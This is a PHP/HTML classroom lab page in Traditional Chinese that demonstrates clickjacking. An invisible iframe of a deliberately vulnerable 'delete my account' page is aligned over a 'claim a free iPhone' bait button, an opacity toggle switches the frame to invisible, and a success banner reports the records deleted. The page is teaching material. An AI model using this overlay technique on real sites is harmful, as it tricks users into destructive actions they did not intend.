<?php
$triggered = isset($_GET['triggered']) ? $_GET['triggered'] : 0;
$deleted = isset($_GET['deleted']) ? intval($_GET['deleted']) : 0;
$guest = isset($_GET['guest']) ? $_GET['guest'] : '1';
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title>🎯 Clickjacking (點擊劫持) 漏洞演練與 PoC</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
    <style>
        body { font-family: sans-serif; background-color: #f4f6f9; padding: 20px; }
        .instructions { background-color: #fff; border-radius: 8px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
        
        /* 點擊劫持攻擊容器 - 對齊內嵌的 target 頁面尺寸 */
        #attack-container {
            position: relative;
            width: 500px;
            height: 300px;
            border: 3px dashed #dc3545;
            margin: 0 auto;
            background-color: #ffeef0;
            overflow: hidden;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }

        /* 惡意誘餌按鈕 (置於最底層，z-index: 1) */
        #bait-button {
            position: absolute;
            top: 100px;
            left: 150px;
            width: 200px;
            height: 50px;
            z-index: 1; /* 位於下層 */
            background-color: #ff9900;
            color: white;
            border: none;
            font-size: 1.1rem;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(255, 153, 0, 0.4);
            transition: transform 0.1s;
        }
        #bait-button:active {
            transform: scale(0.97);
        }

        /* 被嵌入的目標網站 iframe (覆蓋在最上層，z-index: 10) */
        #target-iframe {
            width: 100%;
            height: 100%;
            border: none;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 10; /* 位於上層 */
            /* 預設透明度 0.4 供學員看清楚重疊結構 */
            opacity: 0.4;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div class="container my-4">
    <?php if ($triggered == 1): ?>
        <div class="alert alert-danger text-center py-3 my-3 shadow-lg border border-danger">
            <h4 class="alert-heading font-weight-bold">💥 點擊劫持攻擊成功！ (Clickjacking Exploit Successful)</h4>
            <?php if ($guest === '0'): ?>
                <p class="mb-0">後端防線已失守：您在點選「領取免費 iPhone」時，實際上點擊了隱藏的 iframe 按鈕，導致資料庫中 **<?= $deleted ?>** 筆活動報名紀錄被<strong>真實刪除</strong>！</p>
            <?php else: ?>
                <p class="mb-0">（訪客身分模擬成功）：雖然您目前未登入，但點擊已被透明的 iframe 攔截並發送了 POST 請求。若為登入使用者，其所有活動報名已遭清空！</p>
            <?php endif; ?>
        </div>
    <?php endif; ?>

    <div class="instructions shadow-sm">
        <h2 class="text-danger font-weight-bold text-center">🎯 Clickjacking (點擊劫持) 模擬演練 (PoC)</h2>
        <p class="lead text-center">本頁面展示了攻擊者如何利用隱形 <code>&lt;iframe&gt;</code> 覆蓋於惡意誘餌之上，欺騙使用者在不知情中點擊敏感按鈕。</p>
        
        <div class="alert alert-warning">
            <strong>💡 課堂操作與觀察指南：</strong><br>
            1. <strong>對齊觀察 (0.4)</strong>：目前預設為半透明 (0.4)。您可以看到下方的黃色誘餌按鈕「🎁 點我領取免費 iPhone」與 iframe 內部的紅色按鈕「💥 確定刪除我的帳號」<strong>已經達成像素級完美對齊</strong>。<br>
            2. <strong>真實攻擊模擬 (0.0)</strong>：點選下方「<strong>0.0 (完全隱形 - 真實攻擊)</strong>」按鈕。此時頁面上只看得到黃色的誘餌按鈕，但實際上 iframe 仍覆蓋在上面。試著點擊黃色按鈕，您將會觸發透明 iframe 內的「確定刪除我的帳號」POST 請求！
        </div>

        <div class="my-3 text-center">
            <span class="font-weight-bold mr-2">調整 Target iframe 透明度：</span>
            <button class="btn btn-secondary btn-sm" onclick="setOpacity(1.0)">1.0 (完全顯現 - 對齊除錯)</button>
            <button class="btn btn-primary btn-sm" onclick="setOpacity(0.4)">0.4 (半透明 - 對照觀察)</button>
            <button class="btn btn-danger btn-sm" onclick="setOpacity(0.0)">0.0 (完全隱形 - 真實攻擊)</button>
        </div>
        
        <div class="text-muted text-center small mb-3">
            * 提示：請確保您目前已在弱點版登入（例如 admin 或 student01），否則 iframe 會加載登入頁面而非設定頁。
        </div>
        <div class="text-center">
            <a href="/index.php" class="btn btn-outline-secondary">回首頁</a>
        </div>
    </div>

    <!-- 攻擊演示區 -->
    <div id="attack-container">
        <!-- 惡意誘餌按鈕 (下層) -->
        <button id="bait-button">
            🎁 點我領取免費 iPhone
        </button>

        <!-- 目標網頁 iframe (上層，點擊時會被攔截到此 iframe 中) -->
        <iframe id="target-iframe" src="/clickjacking_target.php"></iframe>
    </div>
</div>

<script>
    function setOpacity(val) {
        document.getElementById('target-iframe').style.opacity = val;
    }
</script>
</body>
</html>
